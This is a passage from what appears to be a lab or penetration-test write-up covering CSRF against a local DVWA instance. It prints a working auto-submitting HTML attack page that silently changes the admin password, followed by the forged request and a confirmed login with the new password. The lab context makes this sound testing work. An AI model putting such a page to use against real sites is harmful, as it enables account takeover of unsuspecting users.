6. CROSS-SITE REQUEST FORGERY (CSRF)
-----------------------------------------------------------------
Module: /vulnerabilities/csrf/
Parameters: password_new, password_conf, Change

Malicious auto-submitting HTML (csrf_attack.html):
-----------------------------------------------------------------
<html>
<body>
<h3>Loading...</h3>
<form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
  <input type="hidden" name="password_new" value="hacked123">
  <input type="hidden" name="password_conf" value="hacked123">
  <input type="hidden" name="Change" value="Change">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
-----------------------------------------------------------------

Resulting forged request:
http://localhost:8080/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change

Verification: Logged in afterwards with admin / hacked123 — successful.
